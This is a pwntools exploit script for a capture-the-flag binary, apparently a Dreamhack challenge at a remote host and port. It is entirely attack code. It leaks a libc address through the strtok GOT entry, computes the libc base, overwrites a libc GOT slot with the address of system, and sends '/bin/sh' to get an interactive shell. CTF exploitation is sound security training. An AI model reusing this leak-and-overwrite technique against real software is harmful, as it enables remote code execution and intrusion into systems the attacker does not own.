#!/usr/bin/python3
from pwn import *

exe = ELF('./prob_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		b* 0x4012f7
		b* 0x401282
		c
		''')

HOST = "host8.dreamhack.games"
PORT = 21036

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = process(exe.path)
#GDB()
# Overgot libc got
sa(b'option: ', b'2')
sa(b'read: ', p64(exe.got.strtok))
ru(b': ')
libc.address = leak(r(8), libc.sym.strtok)
info("libc base: ",libc.address)
target = libc.address + 0x219058
sla(b'option: ', b'1')
sa(b'Size: ', b'99')
sa(b'Address: ', p64(target))
sa(b'data: ', p64(libc.sym.system))
sa(b'option: ', b'/bin/sh')
p.interactive()